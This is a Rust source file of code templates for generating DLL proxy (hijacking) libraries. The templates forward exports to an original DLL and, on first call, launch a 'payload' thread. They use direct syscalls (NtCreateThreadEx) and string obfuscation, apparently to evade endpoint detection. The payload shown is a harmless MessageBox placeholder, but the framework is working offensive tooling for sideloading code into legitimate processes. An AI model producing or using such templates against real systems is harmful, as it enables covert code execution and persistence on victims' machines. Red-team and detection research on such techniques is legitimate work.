pub const BUILD_RS_TEMPLATE: &str = r##"
fn main() {
    if std::env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
        let def = std::path::PathBuf::from(std::env::var("CARGO_MANIFEST_DIR").unwrap())
            .join("proxy.def");
        println!("cargo:rustc-cdylib-link-arg=/DEF:{}", def.display());
        println!("cargo:rerun-if-changed=proxy.def");
    }
}
"##;

pub const CARGO_TOML_TEMPLATE: &str = r#"
[package]
name = "{PACKAGE_NAME}"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
dyncvoke = "0.1"
obfstr = "0.4"

[dependencies.windows-sys]
version = "0.61"
features = [
    "Win32_Foundation",
    "Win32_System_SystemServices",
    "Win32_UI_WindowsAndMessaging",
]
"#;

// PHANDLE is OUT. Thread start is NTAPI (PVOID) -> NTSTATUS.
// THREAD_ALL_ACCESS Vista+ = 0x1FFFFF. MessageBoxA needs a trailing \0; obfstr &str has none.
pub const LIB_RS_TEMPLATE: &str = r##"
#![allow(non_snake_case)]

use std::ffi::c_void;
use std::ptr::{self, null_mut};
use std::sync::Once;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::thread;

use dyncvoke::dyncvoke_core::{get_function_address, load_library_a};
use dyncvoke::syscall;
use obfstr::obfstr as s;
use windows_sys::core::BOOL;
use windows_sys::Win32::System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};

mod forward;

const NATIVE: bool = true;
static PAYLOAD_ONCE: Once = Once::new();
static RESOLVED: AtomicUsize = AtomicUsize::new(0);

#[no_mangle]
unsafe extern "system" fn DllMain(
    _hinst: *mut c_void,
    reason: u32,
    _reserved: *mut c_void,
) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH | DLL_PROCESS_DETACH => 1,
        _ => 1,
    }
}

unsafe extern "system" fn payload_thread(_arg: *mut c_void) -> i32 {
    payload_execution();
    0
}

fn payload_execution() {
    unsafe {
        MessageBoxA(
            null_mut(),
            s!("Module initialized. ProxyMode Success\0").as_ptr(),
            s!("Status\0").as_ptr(),
            MB_OK,
        );
    }
}

fn spawn_payload() {
    if NATIVE {
        let mut thread: *mut c_void = ptr::null_mut();
        let status = syscall!(
            "NtCreateThreadEx",
            &mut thread as *mut *mut c_void,
            0x1FFFFFu32,
            ptr::null_mut::<c_void>(),
            -1isize,
            payload_thread as *mut c_void,
            ptr::null_mut::<c_void>(),
            0u32,
            0usize,
            0usize,
            0usize,
            ptr::null_mut::<c_void>(),
        );
        match status {
            Ok(ptr) if ptr as i32 >= 0 => {
                let _ = syscall!("NtClose", thread);
                return;
            }
            _ => {}
        }
    }
    let _ = thread::spawn(payload_execution);
}

fn dispatch_call(
    a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64,
    a9: u64, a10: u64, a11: u64, a12: u64, a13: u64, a14: u64, a15: u64, a16: u64,
    a17: u64, a18: u64, a19: u64, a20: u64,
) -> u64 {
    PAYLOAD_ONCE.call_once(spawn_payload);

    type ProxyFn = extern "system" fn(
        u64, u64, u64, u64, u64, u64, u64, u64, u64, u64,
        u64, u64, u64, u64, u64, u64, u64, u64, u64, u64,
    ) -> u64;

    let cached = RESOLVED.load(Ordering::Acquire);
    let target = if cached != 0 {
        cached
    } else {
        let dll = s!("{ORIGINAL_DLL_PATH}").to_string();
        let module = load_library_a(&dll);
        if module == 0 {
            return 0;
        }
        let proc = s!("{HIJACK_EXPORT}").to_string();
        let addr = get_function_address(module, &proc);
        if addr == 0 {
            return 0;
        }
        RESOLVED.store(addr, Ordering::Release);
        addr
    };

    unsafe {
        let f: ProxyFn = std::mem::transmute(target);
        f(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20)
    }
}

{HIJACK_FUNCTION}
"##;
